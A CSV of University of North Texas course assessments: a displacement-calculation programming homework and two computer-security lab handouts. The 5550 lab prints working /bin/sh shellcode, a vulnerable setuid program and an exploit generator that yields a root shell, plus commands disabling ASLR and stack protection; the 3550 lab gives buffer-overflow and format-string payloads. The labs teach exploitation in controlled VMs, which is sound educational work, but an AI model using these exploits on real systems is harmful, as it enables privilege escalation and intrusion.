skills,university,class_title,class_code,assessment_title,assessment_type,description
"['algorithm declare', 'variable', 'velocity', 'time', 'velocity variable declared', 'acceleration', 'acceleration variable declared', 'variable declared earlier', 'declared earlier', 'displacement', 'user', 'float', 'variable declared', 'declare a variable', 'algorithm', 'cout', 'declare', 'velocity variable', 'declared', 'acceleration variables', 'variable that represents', 'variable declared earlier.use', 'time variable', 'decimal', 'represents velocity']",The University of North Texas,INTRO TO COMPUTER SCIENCE,1030,Algorthims,Homework,"Homework 1 Algorithm Declare a variable that represents velocity as a float because velocity can be measured down to the decimal and not just as a whole number. Declare a variable that represents acceleration as a float because, just like velocity, acceleration can be measured down to the decimal place also.Declare a variable for time which is represented in seconds as a float because time can be represented as a decimal.Declare a variable for displacement that is also a float and is found using the equation for displacement, which involves using your velocity, time, and acceleration variables that were declared earlier. Use cout to ask the user for the velocity which is in meters per second.Use cin so the user can put in a value for the velocity and save it in the velocity variable declared earlier.Use cout to ask the user for the acceleration which is in meters per second squared.Use cin so the user can put in a value for the acceleration and save it in the acceleration variable declared earlier. Use cout to ask the user for the time which is represented in seconds.Use cin so the user can input a value for the time and save it in the time variable that was declared earlier. For the displacement variable, set it equal to (velocity*time) + ½(acceleration)(time)2. This will get you your displacement in meters.oExample Calculation: Velocity = 2.52Acceleration = 5.25Time = 16.25(2.52) (16.25) + ½ (5.25) (16.25)2 40.95 + 693.1640625734.1140625 metersNext to get make sure that your answer rounds to the hundredths place use cout. precision (2) before your displacement equation. This will result in displacement being rounded to two decimal places. Use cout to read in a line stating what the displacement (which will be found using the displacement equation) is in meters.Return 0."
"['buffer overflow lab', 'buffer overflow', 'overflow lab', 'buffer', 'address', 'stack', 'return address', 'overflow', 'lab', 'program', 'buffer overflow attacks', 'buffer starting address', 'starting address', 'csce', 'fall', 'buffer overflow vulnerability', 'code', 'line', 'return', 'note', 'shellcode', 'frame pointer address', 'buffer address', 'vulnerable program', 'command']",The University of North Texas,INTRO TO COMPUTER SECURITY,5550,Buffer Overflow,Lab,"Student Name:
Course: CSCE 5550
Semester: Fall 2022
Buffer Overflow Lab
Lab 4: Buffer Overflow Lab
This lab is based on the SEED Lab
(https://seedsecuritylabs.org/Labs_16.04/Software/Buffer_Overflow/), 
which uses the SEEDUbuntu-16.04-32bit VM (https://seedsecuritylabs.org/lab_env.html). 
See https://seedsecuritylabs.org/Labs_16.04/Documents/SEEDVM_VirtualBoxManual.pdf
for the manual on importing the SEEDUbuntu VM into VirtualBox. 
Follow the 7 steps in “How to Use Virtualbox to Run SEEDUbuntu VM”. 
For this lab, you do not need to configure the network (as explained in the Appendix B). 
In VirtualBox, for the SEED Ubuntu VM, click in the menu Machine ® Settings…, “Network”
section, in “Attached to”, set “NAT”.
NOTE: Address all the questions (Q1, Q2, etc.) marked in bold.
When a screenshot is requested, try to fit all the results in one image. 
If this is not possible, then attach multiple screenshots.
When a question is asked, e.g. “Who is the owner of the file?”, type your answer, 
do not simply provide a screenshot.
IMPORTANT NOTE: Before starting the lab, you must customize your command prompt as described 
in the Command Prompt Customization Manual. This customization manual directs you to place your 
EUID (Enterprise User ID) into the command prompt. Submissions which do not comply with this 
requirement will receive no credit.
Introduction
The learning objective of this lab is for students to gain the first-hand experience on buffer-overflow 
vulnerability. Buffer overflow is defined as the condition in which a program attempts to write data 
beyond the boundaries of pre-allocated fixed length buffers. This vulnerability can be used by a 
malicious user to alter the flow control of the program, leading to the execution of malicious code.
In this lab, students will be given a program with a buffer-overflow vulnerability; their task is to 
develop a scheme to exploit the vulnerability and finally gain the root privilege. In addition to the 
attacks, students will be guided to walk through several protection schemes that have been 
implemented in the operating system to counter against buffer-overflow attacks.
NOTE: You do not need to run any commands in this section.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Buffer Overflow Lab
Overview of Stack
A stack is a contiguous block of memory containing data. The stack consists of logical stack frames 
that are pushed when calling a function and popped when returning. A stack frame contains 
the parameters to a function, its local variables, and the data necessary to recover the previous stack 
frame, including the value of the instruction pointer at the time of the function call. Depending on 
the implementation, the stack will either grow down (towards lower memory addresses), or up. 
In the Ubuntu OS on an Intel x86 architecture (i.e., 32-bit version), which you will use for this lab, 
stack grows downwards. 
A CPU register called the stack pointer (SP) points to the top of the stack. The bottom of the stack is at 
a fixed address. Its size is dynamically adjusted by the kernel at runtime. The CPU implements 
instructions to PUSH onto and POP off of the stack. 
The stack pointer (SP) is also implementation-dependent. It may point to the last address on the stack, 
or to the next free available address after the stack. For our discussion, we will assume that it points to 
the last address on the stack. In addition to the stack pointer, which points to the top of the stack 
(lowest numerical address), it is often convenient to have a frame pointer which points to a fixed 
location within a frame. In principle, local variables could be referenced by giving their offsets from 
SP. However, as words are pushed onto the stack and popped from the stack, these offsets change. 
Although in some cases the compiler can keep track of the number of words on the stack and thus 
correct the offsets, in some cases it cannot, and in all cases considerable administration is required. 
Furthermore, on some machines, such as Intel-based processors, accessing a variable at a known 
distance from SP requires multiple instructions. Consequently, many compilers use a second register, 
the frame pointer (FP), for referencing both local variables and parameters because their distances from 
FP do not change with PUSHes and POPs. 
Local variables of a function are stored below (at a lower address) in memory. The return address is 
stored above (at a higher address) to FP. If we know the FP, we can try to calculate memory locations at 
which return address and local variables are stored. On Intel CPUs, the stack Base Pointer (BP/EBP) is 
used for this purpose. Due to the way the stack grows, actual parameters have positive offsets (stored 
above the FP) and local variables have negative offsets from FP. The first action a procedure must 
perform when called is to save the previous FP (so that it can be restored at the procedure exit). 
Then, it copies SP into FP to create the new FP, and advances SP to reserve space for the local 
variables. This code is called the procedure prolog. Upon the procedure exit, the stack must be cleaned 
up again – something called the procedure epilog. See the below example that illustrates the stack 
layout for a function.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Buffer Overflow Lab
In order to successfully exploit the vulnerability described above, we need to do the following:
1. Find the return address.
2. Create an exploit code to overwrite the buffer.
3. Overwrite the buffer:
i. Overwrite the return address to make it point to a further location in the buffer, where our 
malicious code resides.
ii. Put malicious code in the right location specified by the return address 
(which we changed).
The below figure illustrates how this attack works.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Buffer Overflow Lab
Finding the address in the memory which stores the return address
From the above figure, we see that if we can find out the address of buffer[] array, we can calculate 
where the return address is stored. There are two ways to do this:
1. One can debug the vulnerable program. In the debugger, one can figure out the address of 
buffer[], and thus calculate the starting point of the malicious code.
2. One can modify the copied program, and ask the program to directly print out the address of 
buffer[]. In this lab, for simplicity, we use the second approach: We add a “print” statement to 
show the starting address of buffer[] and then try to estimate the location (address) of the return 
address.
The above methods are feasible when the vulnerable program is running locally, and an attacker has 
access to it. Of course, if the target program is running remotely, one may not be able to rely on the 
debugger to find out the address. In addition, in most real-time scenarios, one cannot simply modify the 
binary to print the buffer address. However, one can always guess in those situations. The following 
facts make guessing quite a feasible approach:
• Stack usually starts at the same address (assuming that stack randomization is disabled).
• Stack is usually not very deep: Most programs push about a few hundred (or thousand) bytes 
into the stack at any single time.
For these reasons, the range of addresses that one needs to guess is actually quite small. Once we have 
successfully learned the return address, we can overwrite it with the address of our malicious code.
We note that on x64 architecture (i.e., 64-bit version), the buffer overflow attacks are generally more 
difficult to implement as compared to x86, but they are still feasible.
Finding the starting point of the malicious code
If one can accurately calculate the address of buffer[], one should be able to accurately calculate 
the starting point of the malicious code. We can place the malicious code in the buffer after a certain 
offset (distance) from the modified return address. Even if we cannot accurately calculate the address 
(for example, for remotely run programs), we can still guess. To improve our chances of success, we 
can add a number of NOPs (“no-operations”, i.e., instructions that do nothing) to the beginning of 
the malicious code. This way, if we can jump to any of these NOPs, we can eventually get to 
the malicious code. This approach called “the NOP slide” increases the attacker’s chance of success.
The following figure depicts the attack.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Buffer Overflow Lab
Overview of Shell code and Vulnerable Program:
Ubuntu and other Linux distributions have implemented several security mechanisms to make 
the buffer overflow attacks difficult. In order to improve the performance of our attack, we need to 
disable them first.
a. Address Space Layout Randomization (ASLR). 
Ubuntu and several other Linux-based systems use ASLR to change the starting address of heap and 
stack. This makes guessing the addresses difficult (remember that this is one of the critical steps of 
the buffer overflow attacks). In this lab, we disable these features using the following command:
sysctl -w kernel.randomize_va_space=0
b. The StackGuard Protection Scheme. 
The GCC compiler implements a security mechanism called “StackGuard” to prevent buffer overflows. 
In the presence of this protection, a straightforward buffer overflow attack strategy that we are trying to 
implement will not work. One can disable this protection when compiling the program using 
the following option: “-fno-stack-protector”. For example, to compile a program “example.c” with 
Stack Guard disabled, the following command should be used:
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Buffer Overflow Lab
gcc -o example -fno-stack-protector example.c 
c. Non-Executable Stack. 
Ubuntu used to allow executable stacks, but this has now changed: the binary images of programs (and 
shared libraries) must declare whether they require executable stacks or not, i.e., they need to mark 
a field in the program header. The kernel or dynamic linker uses this marking to decide whether to 
make the stack of this running program executable or non-executable. This marking is done 
automatically by the recent versions of gcc, and by default, the stack is set to be non-executable. 
For our shellcode to work (i.e., to successfully exploit the vulnerable application), we need the stack to 
be executable. In order to enable this, the following option should be used when compiling programs:
gcc -z execstack -o test test.c
d. Configuring /bin/sh.
In Ubuntu 16.04 VM, the /bin/sh symbolic link points to the /bin/dash shell. However, the dash shell in 
Ubuntu 16.04 has a countermeasure that prevents itself from being executed in a Set-UID process. 
Basically, if dash detects that it is executed in a Set-UID process, it immediately changes the effective 
user ID to the process’s real user ID, essentially dropping the privilege. Since our victim program is a 
Set-UID program, and our attack relies on running /bin/sh, the countermeasure in /bin/dash makes our 
attack more difficult. Therefore, we will link /bin/sh to the Z shell (zsh), which is familiar to us by the 
previous lab. As you may remember, zsh does not have the above mentioned countermeasure. (In fact, 
the countermeasure in /bin/dash can be defeated with a little more effort, but we will leave out of scope 
in this lab.). The following command will link /bin/sh to zsh: 
ln -sf /bin/zsh /bin/sh
Section 1: Testing the Shellcode
Before starting the attack, let us get familiar with the shellcode. A shellcode is the code to launch a 
shell. It has to be loaded into the memory so that we can force the vulnerable program to jump to it. 
Consider the following program:
#include <stdio.h>
int main() 
{
char *name[2];
name[0] = ""/bin/sh""; 
name[1] = NULL;
execve(name[0], name, NULL);
}
The shellcode that we use is the assembly version of the above program.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Buffer Overflow Lab
The following program gives you an idea how to launch the shell by executing a shellcode stored in 
a buffer. (This is only a demo. The actual program that will create the shellcode will be provided later 
in this manual.)
/*call_shellcode.c*/
/*A program that launches a shell using shellcode*/
#include <stdlib.h>
#include <stdio.h>
const char code[] =
""\x31\xc0"" /*Line 1: xorl %eax,%eax*/
""\x50"" /*Line 2: pushl %eax*/
""\x68""""//sh"" /*Line 3: pushl $0x68732f2f*/
""\x68""""/bin"" /*Line 4: pushl $0x6e69622f*/
""\x89\xe3"" /*Line 5: movl %esp,%ebx*/
""\x50"" /*Line 6: pushl %eax*/
""\x53"" /*Line 7: pushl %ebx*/
""\x89\xe1"" /*Line 8: movl %esp,%ecx*/
""\x99"" /*Line 9: cdq*/
""\xb0\x0b"" /*Line 10: movb $0x0b,%al*/
""\xcd\x80"" /*Line 11: int $0x80*/
;
int main(int argc, char **argv)
{
char buf[sizeof(code)];
strcpy(buf, code);
((void(*)( ))buf)( );
}
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Buffer Overflow Lab
Copy-paste the above code to a file “call_shellcode.c”, and then compile it using the following gcc 
command. Note that the “execstack” option must be used—it allows the code to be executed from 
the stack; without this option, the program will fail.
gcc -z execstack -o call_shellcode call_shellcode.c
Run the program:
./ call_shellcode
Q1: Attach a screenshot of the result. Describe your observations. (Did you get the shell?)
Note: Close the terminal window. (In Section 3, you will open a new terminal window.)
A few places in the above shellcode are worth explaining. First, the third instruction pushes “//sh”, 
rather than “/sh” into the stack. This is because we need a 32-bit number here, and “/sh” has only 24 
bits. Fortunately, “//” is equivalent to “/”, so we can get away with a double slash symbol. Second, 
before calling the execve() system call, we need to store name[0] (the address of the string), name (the 
address of the array), and NULL to the %ebx, %ecx, and %edx registers, respectively. Line 5 stores 
name[0] to %ebx; Line 8 stores name to %ecx; Line 9 sets %edx to zero. There are other ways to 
set %edx to zero (e.g., xorl %edx, %edx); the one (cdq) used here is simply a shorter instruction: it 
copies the sign (bit 31) of the value in the EAX register (which is 0 at this point) into every bit position 
in the EDX register, basically setting %edx to 0. Third, the system call execve() is called when we 
set %al to 11, and execute “int $0x80”.
Section 2: The Vulnerable Program
/*stack.c*/
/*This program has a buffer overflow vulnerability.*/
/*Our task is to exploit this vulnerability*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int bof(char *str)
{
char buffer[12];
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Buffer Overflow Lab
 /*print the starting address of buffer*/
printf(""The starting address of buffer is %p\n"", buffer);
/*The following statement has a buffer overflow problem*/
strcpy(buffer, str);
/*Print the frame pointer address*/
printf(""Frame Pointer Address is: %p\n"", __builtin_frame_address(0)); 
/*Use this address to find the return address*/
return 1;
}
int main(int argc, char **argv)
{
char str[517];
FILE *badfile;
badfile = fopen(""badfile"", ""r"");
fread(str, sizeof(char), 517, badfile);
bof(str);
//printf(""The address of the stack pointer is: 0x%x\n"", __asm__(""movl %esp,%eax""));
printf(""Returned Properly\n"");
return 1;
}
The above program has a buffer overflow vulnerability. It first reads an input from a file called badfile, 
and then passes this input to another buffer in the function bof(). The original input can have 
a maximum length of 517 bytes, but the buffer in bof() is only 12 bytes long. Because strcpy() does not 
check boundaries, a buffer overflow will occur. Since we will make this program a Set-UID program 
owned by root, if a normal user can exploit this buffer overflow vulnerability, this normal user might be 
able to get a root shell.
It should be noted that the program gets its input from a file called badfile. This file is under users’ 
control. Now, our objective is to create the contents for badfile, such that when the vulnerable program 
copies the contents into its buffer, a root shell can be spawned. In the function bof, we have added a
line to print the starting address of the buffer, so that we can calculate the location (address) of 
the return address and then overwrite it. Note that this is for learning purpose only. In a real-life attack, 
an attacker cannot modify an existing binary. Instead, the attacker will have to guess the return address.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Buffer Overflow Lab
Section 3: Preparing the Environment
Run the following commands:
1. Open the terminal.
2. Change to root user from normal user:
sudo su root
(password: “seedubuntu”)
Note: Do not relinquish the root privileges until directed by the manual.
3. To determine whether our system is running 32-bit (i.e., ""i686"") or 64-bit (""x86_64"") kernel 
architecture, type the following command: 
uname -m
Note: Alternatively, the “arch” command may be used.
Q2: Attach a screenshot of the result. 
4. Disable address space randomization:
sysctl -w kernel.randomize_va_space=0
Q3: Attach a screenshot of the result.
5. Copy the “stack.c” file into your Linux VM.
Tips: If a direct copy-pasting does not work, you may email it to yourself, and then access it 
via the webmail in the VM. Alternatively, you may access the Canvas site in the browser.
NOTE: If you copy-paste from the manual, use the DOCX file, as copy-pasting from the PDF 
file may add unwanted special symbols. 
6. Compile “stack.c”:
gcc -o stack -z execstack -fno-stack-protector stack.c
7. Make the stack executable and Set-UID:
chmod 4755 stack
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Buffer Overflow Lab
(After the above command, the executable program “stack” will be marked in red, when listed 
in the terminal window.)
Type the “ls” command in the terminal.
Q4. Attach a screenshot of the result.
8. Exit from the root user prompt to a normal user, (i.e., relinquish the root privileges):
exit
NOTE: Observe the prompt change from # to $.
9. Create an empty file “badfile”:
touch badfile
10. Run the application (do it twice):
./stack
./stack
This step will print the buffer starting address and frame pointer (two times). 
The values have to be the same both times.
Q5: Attach a screenshot of the result.
11. Delete “badfile”:
rm -rf badfile
Section 4: Exploiting the Vulnerability
1. Make a note of the buffer starting address and the frame pointer address. 
In our case, these are 0xbffff144 and 0xbffff158, respectively. (Most probably, the values that you 
see will be different.) What is the distance between the two? Typically, it will be some number of 
bytes, but it may vary.
2. Find the address (location) of the return address. It is 4 bytes away from the frame pointer. 
In our case, the return address is stored in the locations 15c-15f. Let us call it an offset.
(The frame pointer value is stored in 168-16b).
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Buffer Overflow Lab
3. You need to calculate an appropriate address (call it a safe_offset) to overwrite the return address. 
At some point after safe_offset, you will write your shellcode to the buffer. 
Now, the return address points to this “safe offset” to execute our shellcode.
In the below code, we have chosen 0xbffff174 as our safe_offset (48 locations away from 
the buffer starting address 0xbffff144 and 20 locations away from the return address 0xbffff16c). 
You may need to increase or decrease the distance between buffer and safe_offset for it to work 
perfectly. Here, you have to use the trial-and-error method a few times in order to find a perfectly 
working safe_offset.
4. In the line
memcpy(buffer+60,shellcode,sizeof(shellcode))
in the below code, we used “buffer+60”, which means that our shellcode starts from the address 
60 of the buffer, and this has to be after the safe_offset. 
5. Now, you have to write your safe_offset address location in the little endian style and assign it to 
“char *ret” variable. For example, the little endian style for the address “0x12345678” is 
“\x78\x56\x34\x12”, and for “0xbffff174”, it is “\x74\xf1\xff\xbf”.
In brief, all you have to do is: Run the “stack” program, get the buffer pointer and the frame pointer 
addresses, select an address after the frame pointer as safe_offset, assign it to “ret” in the little endian 
style and start writing the shellcode after the safe_offset (buffer+distance to safe_offset+some_value).
Hint: Usually, on a 32-bit Ubuntu, the buffer in the stack starts on 0xbffff144 or 0xbffff154 or 
0xbffff164, etc. Hence, change the safe_offset and buffer+distance values accordingly. For the buffer 
address 0xbffff154 use 0xbffff184 as safe_offset, for 0xbffff164 use 0xbffff194. The shellcode starting 
address can begin at “buffer+60”. 
Code for “exploit.c”:
/*exploit.c*/
/*A program that creates a file containing the shellcode*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Buffer Overflow Lab
char shellcode[]=
""\x31\xc0"" /*xorl %eax,%eax*/
""\x50"" /*pushl %eax*/
""\x68""""//sh"" /*pushl $0x68732f2f*/
""\x68""""/bin"" /*pushl $0x6e69622f*/
""\x89\xe3"" /*movl %esp,%ebx*/
""\x50"" /*pushl %eax*/
""\x53"" /*pushl %ebx*/
""\x89\xe1"" /*movl %esp,%ecx*/
""\x99"" /*cdq*/
""\xb0\x0b"" /*movb $0x0b,%al*/
""\xcd\x80"" /*int $0x80*/
;
void main(int argc, char **argv)
{
char buffer[517];
FILE *badfile;
/*Assign the return address in big endian style*/
char * ret =""\x74\xf1\xff\xbf""; //here goes your safe_offset address
int i=0;
/*Initialize buffer with 0x90 (NOP instruction)*/
memset(&buffer, 0x90, 517);
/*Fill the buffer with shell code starting from a value after safe offset*/
memcpy(buffer+60,shellcode,sizeof(shellcode)); //copy shellcode into buffer
/*Overwrite return address*/
for(i=0;i<32;i+=4)
memcpy(buffer+i,ret,sizeof(ret));
/*Save the contents to the file ""badfile""*/
badfile = fopen(""./badfile"", ""w"");
fwrite(buffer, 517, 1, badfile);
fclose(badfile);
}
6. Copy the above code to a file “exploit.c”. 
(See Item 3 of the previous task for hints and warnings regarding copying the code.)
7. Compile exploit.c
gcc -o exploit exploit.c
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Buffer Overflow Lab
8. Run exploit to create badfile:
./exploit
9. Run the following two commands:
ls
hexdump -C badfile // This command displays the badfile to the terminal. 
Q6: Attach a screenshot of the result.
IMPORTANT NOTE: Compile your vulnerable program first. Note that the program “exploit.c”, 
which generates badfile, can be compiled with the default StackGuard protection enabled. 
This is because we are not going to overflow the buffer in this program. We will be overflowing 
the buffer in “stack.c”, which is compiled with the StackGuard protection disabled.
10. Run the following command:
./stack
Q7. Attach a screenshot of the result.
11. Type an “exit” command to return to your original shell (the one with the customized prompt).
12. Change your shell to zsh with this command:
sudo ln -sf /bin/zsh /bin/sh
(Note: The purpose of using zshell is to avoid the built-in Set-UID protection of dash and bash.)
13. Now, run the vulnerable program “stack”. If your exploit is implemented correctly, 
you should be able to get a root shell: 
 ./stack
Note: If your exploit works correctly, you should get the root prompt “#”.
It should also be noted that although you have obtained the root prompt “#”, your Real User ID
remains the same – i.e., that of the normal user, while the Effective User ID is now 0 (root). 
You can check this by typing the following:
14. Type the “id” command. (You need to have the root prompt “#”.)
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Buffer Overflow Lab
Q8: Attach a screenshot of the result.
NOTE: Before proceeding to the next section, type the “exit” command to return to your original shell 
(the one with the customized prompt).
Section 5: Countermeasures against buffer overflow
a. Address Space Layout Randomization
15. Enable address randomization using the below command:
sudo sysctl -w kernel.randomize_va_space=2
16. Perform the attacks described earlier by running the programs:
./exploit
./stack
Q9. Attach a screenshot of the result. Did your attack work? Explain your observations.
b. StackGuard
17. Turn off address randomization using the following command:
sudo sysctl -w kernel.randomize_va_space=0
18. Compile the stack program again (as you remember, the StackGuard is enabled by default):
gcc -o stack stack.c
19. Change the permission of the “stack” file to make it Set-UID:
sudo chmod u+s stack
20. Type:
ls
Q10. Attach a screenshot of the result.
21. Run the “stack” program:
./stack
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Buffer Overflow Lab
Q11. Attach a screenshot of the result. Did your attack work? Explain your observations."
"['program security lab', 'address', 'program security', 'security lab', 'target address', 'linux cse', 'program', 'lab', 'linux cse machines', 'code', 'stack', 'provide a screenshot', 'function', 'buffer', 'buffer overflow', 'security', 'return address', 'bytes', 'command', 'target address data', 'linux cse machine', 'cse', 'csce', 'provide', 'input']",The University of North Texas,INTRO TO COMPUTER SECURITY,3550,Buffer Overflow Vuln,Lab,"Student Name:
Course: CSCE 3550
Semester: 
Program Security Lab
1 of        9
Lab 1: Program Security Lab
This lab will be completed on our Linux CSE servers (i.e., cse01 – cse06).
Section 1: Buffer Overflow
A buffer overflow is a vulnerability that exists in low-level languages like C where an attacker can crash 
the program, corrupt the data, steal information, or even run the attacker’s own code. A buffer 
overflow can occur when accessing memory space outside of a data structure, such as a string or 
character array. Typically, variables are stored together in a stack, heap, or other structure so that 
accessing any out-of-bounds memory of an array, for example, can result in reading or writing of bytes 
for some other variable. Although there are many different ways to perform a buffer overflow attack, 
in this lab we would like to exploit a buffer overflow on our Linux CSE machines by smashing the stack 
and modifying the return address of a function so as to execute that return address and display a 
congratulatory message with a secret code.
In this problem, you will perform several operations and analyze the results. A source code program in 
C called bufOvfl.c was written that contains a function called privateFunction() whose only 
purpose is to print out a congratulatory message and display a secret code word. The operating system 
on each of our CSE machines has enabled stack protection (i.e., preventing ""smashing the stack"" 
attacks), so the source code was compiled with the –fno-stack-protector option to disable the 
stack protection for this activity. Without this compile option, our buffer overflow attack would result 
in the following error, even though done correctly:
*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)
The bufOvfl executable is being provided to you in this assignment and your goal is to exploit the 
binary (i.e., executable) to print out the congratulatory message and secret code word by just modifying 
the input.
Currently, you can run the program, enter some text, and it will print out the text that you entered as 
follows (check it out for yourself, but make sure the downloaded file is executable, i.e., chmod u+x 
bufOvfl):
$ ./bufOvfl
Enter some text:
hello
You entered: hello
Instead of simply echoing our input as shown above, we want it to respond with a congratulatory 
message and the secret code word.
Student Name:
Course: CSCE 3550
Semester: 
Program Security Lab
2 of        9
Before starting your attack, you need to first examine the memory layout of a C program, especially the 
stack, the stack contents, and what happens during function calls and returns.
Let’s review some of the essential components to make sure you understand how data is stored and 
used.
• For a function, the stack stores all function parameters, return addresses, and local variables of 
the function. As a LIFO (Last In, First Out) structure, it grows downward in memory as new 
function calls are made.
• Executable code is stored in the text section. The loader then loads instructions from the text 
section and executes them.
• The stack pointer register, %esp, stores the address of the top of the stack, which is the address 
of the last element on the stack. Since the stack grows downward in memory, the %esp points 
to the value in the stack at the lowest memory address.
• The base pointer register, %ebp, is usually set to %esp at the start of the function to keep tab 
of function parameters and local variables. Local variables are accessed by subtracting offsets 
from %ebp while function parameters are accessed by adding offsets to %ebp.
• The instruction pointer register, %eip, stores the address of the next instruction to be executed. 
After each instruction is executed, its value is incremented depending on the size of the 
instruction.
Student Name:
Course: CSCE 3550
Semester: 
Program Security Lab
3 of        9
The first thing that we want to do to exploit this binary is display the disassembled executable code on 
one of our CSE machines as follows:
$ objdump –d ./bufOvfl
You can run man objdump for help on using this utility. Note that each student’s output may vary 
because the loader may load the executable in a different memory location for each student.
There exists a function in the source code called privateFunction(). The hex address of
privateFunction(), is displayed to the left of the text ""<privateFunction>:"". You will need 
to keep track of this hex address as this will be address that we will use when overwriting the return 
address on the stack.
Q1: Provide a screenshot of the <privateFunction> block of memory only and note the 
starting hex address of the privateFunction() for later use.
Now, we want to see how many bytes are reserved for the buffer that we can use to overflow. We look 
for the second lea instruction in the echo() function that indicates the address of the buffer that 
starts at so many bytes before the %ebp register. The value after the ""-"" and before the %ebp in 
parentheses is the number of bytes in hex reserved for the buffer. You will need this value in decimal 
to know how many bytes (i.e., characters) in the echo() function are reserved for the buffer.
Q2: Provide a screenshot of the line with the second lea instruction in the echo() function.
Q3: Convert this hexadecimal value for the number of bytes reserved for the buffer to its decimal 
representation and write down its decimal value.
Student Name:
Course: CSCE 3550
Semester: 
Program Security Lab
4 of        9
Before designing our payload to overflow the buffer, we need to get some information about our Linux 
CSE machine architecture.
To determine whether our system is running 32-bit (i.e., ""i686"") or 64-bit (""x86_64""), we can issue 
the uname –m command or arch command to see the result. This will Identify whether or not our 
Linux CSE machine is running in 32-bit or 64-bit mode (i.e., whether or not a 32-bit or 64-bit address is 
needed in the return address). You can write down the bit mode result here:
Q4: Provide a screenshot of the results for both of these commands that includes your EUID, 
showing which mode is used. Note that both of these commands should result in the same 
mode.
We can confirm whether or not the byte order of our system is big endian or little endian with the 
following command:
$ lscpu | grep Endian
The difference between little endian and big endian can be summarized here:
The output will indicate which byte order our system is using. 
Q5: Provide a screenshot of the results for this command that includes your EUID identifying the 
byte order that our Linux CSE server is using.
Now, we now need to design our payload so that we can overflow the buffer. Given that x number of 
bytes (found in Q3 above) are reserved for the buffer, we also know that it is located right next to %ebp, 
the base pointer register of the main() function. If the system is running in 32-bit mode, then the next 
4 bytes will store the %ebp and the subsequent 4 bytes after that will store the return address that 
%eip will jump to after it completes the function. However, if the system is running in 64-bit mode, 
then the %ebp and the return address will be 8 bytes each. What this means is that x plus either 4 or 
Student Name:
Course: CSCE 3550
Semester: 
Program Security Lab
5 of        9
8 bytes (depending on whether the system runs in 32-bit or 64-bit mode) should be any random 
characters and then the next 4 or 8 bytes (again, depending on the system running in 32-bit or 64-bit 
mode) will be the address of the privateFunction() function.
We know the address of the privateFunction() function, but we need to make sure the address 
of privateFunction() is put in the proper format: for a little endian machine, the bytes need to 
be specified in reverse order, but in a big endian machine, the bytes need to be specified as shown.
Fortunately, we can accomplish this task in Python by piping this payload directly into the bufOvfl
binary executable. For example, assuming the privateFunction() has an address in hex of 
0x01234567 on a big endian machine running in 32-bit mode and we want to add 20 bytes of random 
characters, we could perform the following:
$ python –c 'print ""a""*20 + ""\x01\x23\x45\x67""' | ./bufOvfl
In this example, we are sending 20 lowercase a's followed by the hex address of
privateFunction() to the bufOvfl binary executable. We print \x01 because the 01 was in 
hex. If we did this correctly, the binary would print out our text (followed by some garbage characters), 
plus a congratulatory message with the secret code word. Do not worry if a segmentation fault (core 
dump) occurs as long as you get the secret code word!
Q6: Provide a screenshot of the results for this command that includes your EUID showing your 
Python command as well as the results with the congratulatory statement and secret code 
word.
Student Name:
Course: CSCE 3550
Semester: 
Program Security Lab
6 of        9
Section 2: Format String Vulnerabilities
Another attack on format string vulnerabilities is to change the program’s data in memory to some 
other value. But we need to understand a few things first.
Using the %n format specifier in printf() can result in writing the number of characters printed out 
so far into memory. Consider the following sample code:
#include <stdio.h>
int main()
{
int i;
 printf(""hello%n\n"", &i);
 printf(""i = %d\n"", i);
 return 0;
}
In the above code, when printf() gets to the %n, it has already printed five characters, so it stores 
the integer 5 to the provided memory address for i. Compile and run the code to verify for yourself.
The %n treats the value pointed to by the va_list pointer as a memory address and writes to the 
location. Hence, if we want to write a value to a memory location, we need to have its address on the 
stack.
In the fmtStrVuln.c code included with this assignment, if we know the address of the var to be 
0xbffff304, for example, we can use command substitution at our command prompt on our Linux 
CSE machines as follows to change the value contained in the var variable:
$ echo $(printf ""\x04\xf3\xff\xbf"").%x.%x.%x.%x.%x.%n > input
The address of var is given in the beginning of the input so that it is stored on the stack. The 
$(command) is command substitution that allows the output of the command to replace the 
command itself. Note that ""x04"" indicates that ""04"" is an actual number and not two ASCII 
characters. This will create a file called input in your current directory that will be used to redirect 
input from the keyboard to this input file in our attack.
Since we know that the address of var is on the stack, our goal is to move the va_list pointer to 
this location and then use %n to store some value. We can use %x to advance the va_list pointer. 
Unknown to us, though, is how many %x’s are required to do this. This can be visualized as follows:
Student Name:
Course: CSCE 3550
Semester: 
Program Security Lab
7 of        9
Using trial and error (as is often the case when creating an attack), we check how many %x’s are needed 
to print out 0xbffff304.
Compiling and executing the fmtStrVuln.c code with the assumption that var has an address of 
0xbffff304, for example, we can see the following example:
$ echo $(printf ""\x04\xf3\xff\xbf"").%x.%x.%x.%x.%x.%n > input
$ ./a.out < input
Target address: bffff304
Target address data: 0x11223344
Enter a string: ****.63.b7fc5ac0.b7eb8309.bffff33f.11223344.
Target address data: 0x2c
Here, we needed five %x format specifiers and one %n, but yours may differ. After the attack, data in 
the target address was modified to 0x2c (44 in decimal) since 44 characters were printed out before 
the %n.
This would be a great and easy format specifier vulnerabilities attack, except for one problem. When 
you run the program again and again, will you get the same address? The answer is no! You can verify 
for yourself by running your program several times and checking the target address.
Address randomization (i.e., ASLR) was introduced to make a number of attacks more difficult, such as 
buffer overflow, format string, etc. Unfortunately, turning off address randomization on our Linux CSE 
machines requires a sudo password, which means you need root access since the 
/proc/sys/kernel/randomize_va_space interface controls ASLR system-wide.
Fortunately, we don’t need a system-wide change, so we can use the ADDR_NO_RANDOMIZE flag to 
temporarily disable ASLR for your shell only. Control of this flag can be done with setarch and its -R
option as follows:
$ setarch `uname -m` -R /bin/bash
Student Name:
Course: CSCE 3550
Semester: 
Program Security Lab
8 of        9
